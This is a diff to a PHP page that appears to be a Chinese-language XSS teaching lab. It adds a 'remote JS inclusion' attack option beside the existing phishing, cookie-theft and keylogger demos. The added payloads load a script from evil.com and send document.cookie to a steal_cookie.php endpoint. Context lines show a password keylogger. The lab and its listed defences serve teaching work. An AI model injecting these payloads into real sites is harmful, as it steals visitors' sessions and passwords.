@@ -268,6 +268,7 @@ if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['comment']) && !empty(t
                                         <option value="phishing">🎣 钓鱼攻击（窃取账号密码）</option>
                                         <option value="cookie">🍪 Cookie窃取</option>
                                         <option value="keylogger">⌨️ 键盘记录（窃取输入）</option>
+                                        <option value="remotejs">🌐 远程JS引入（加载外部恶意脚本）</option>
                                     </select>
                                 </div>
                                 <div class="demo-row">
@@ -492,6 +493,21 @@ if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['comment']) && !empty(t
         password: '<scr' + 'ipt>\n// 密码框记录演示\n(function() {\n    var passwordFields = document.querySelectorAll("input[type=\"password\"]");\n    passwordFields.forEach(function(field) {\n        field.addEventListener("input", function(e) {\n            fetch("save_keylog.php?k=" + encodeURIComponent(\n                "[密码:" + e.target.value + "]"\n            ));\n        });\n    });\n})();\n</scr' + 'ipt>'
     };
     
+    // 远程JS引入Payload模板
+    const remoteJsPayloads = {
+        basic: '<scr' + 'ipt src="http://evil.com/malicious.js"></scr' + 'ipt>',
+        
+        jquery: '<scr' + 'ipt src="https://code.jquery.com/jquery-3.6.0.min.js"></scr' + 'ipt>\n<scr' + 'ipt>\n// 演示：使用jQuery发送请求\n$.get("steal_cookie.php?c=" + encodeURIComponent(document.cookie));\nalert("远程jQuery已加载，Cookie已发送！");\n</scr' + 'ipt>',
+        
+        jsonp: '<scr' + 'ipt>\n// JSONP方式加载远程脚本\n(function() {\n    var script = document.createElement("script");\n    script.src = "steal_cookie.php?callback=handleData&c=" + encodeURIComponent(document.cookie);\n    document.body.appendChild(script);\n})();\n</scr' + 'ipt>',
+        
+        dynamic: '<scr' + 'ipt>\n// 动态创建script标签加载远程JS\n(function() {\n    var script = document.createElement("script");\n    script.src = "payload_library.js"; // 演示：加载本地JS文件\n    script.onload = function() {\n        alert("远程脚本已加载！\\n实际攻击中会加载恶意JS文件");\n    };\n    document.body.appendChild(script);\n})();\n</scr' + 'ipt>',
+        
+        protocol: '<scr' + 'ipt src="javascript:alert(\'XSS通过协议处理程序触发！\\n实际攻击可执行任意代码\')"></scr' + 'ipt>',
+        
+        datauri: '<scr' + 'ipt src="data:text/javascript;base64,YWxlcnQoJ1hTUyB0aHJvdWdoIERhdGEgVVJJIScp"></scr' + 'ipt>'
+    };
+    
     // 更新Payload选项
     function updatePayloadOptions() {
         const attackType = document.getElementById('attackType').value;
@@ -527,6 +543,17 @@ if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['comment']) && !empty(t
             `;
             cookieInfo.style.display = 'none';
             keyloggerInfo.style.display = 'block';
+        } else if(attackType === 'remotejs') {
+            payloadSelect.innerHTML = `
+                <option value="basic">基础远程JS引入（推荐）</option>
+                <option value="jquery">jQuery远程加载</option>
+                <option value="jsonp">JSONP方式加载</option>
+                <option value="dynamic">动态创建Script标签</option>
+                <option value="protocol">协议处理程序</option>
+                <option value="datauri">Data URI方式</option>
+            `;
+            cookieInfo.style.display = 'none';
+            keyloggerInfo.style.display = 'none';
         }
     }
 
@@ -553,6 +580,9 @@ if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['comment']) && !empty(t
         } else if(attackType === 'keylogger') {
             payload = keyloggerPayloads[select.value];
             attackName = '键盘记录';
+        } else if(attackType === 'remotejs') {
+            payload = remoteJsPayloads[select.value];
+            attackName = '远程JS引入';
         }
         
         if(textarea) {
@@ -588,6 +618,9 @@ if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['comment']) && !empty(t
         } else if(attackType === 'keylogger') {
             payload = keyloggerPayloads[select.value];
             attackName = '键盘记录';
+        } else if(attackType === 'remotejs') {
+            payload = remoteJsPayloads[select.value];
+            attackName = '远程JS引入';
         }
         
         // 创建临时div执行脚本
@@ -614,6 +647,13 @@ if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['comment']) && !empty(t
         if(attackType === 'keylogger') {
             setTimeout(() => {
                 alert('✅ 键盘记录已启动！\n请在页面任意位置输入内容，然后访问 viewer.php?tab=keylogs 查看记录。');
+            }, 500);
+        }
+        
+        // 对于远程JS引入，显示提示
+        if(attackType === 'remotejs') {
+            setTimeout(() => {
+                alert('✅ 远程JS引入演示！\n\n攻击原理：\n1. 攻击者在评论中注入<script src="恶意JS地址">\n2. 用户访问页面时自动加载恶意JS\n3. 恶意JS可以执行任意操作：窃取Cookie、记录键盘、钓鱼等\n\n防御方法：\n• CSP策略限制脚本来源\n• 输入过滤和输出编码\n• 使用HttpOnly Cookie');
             }, 500);
         }
         
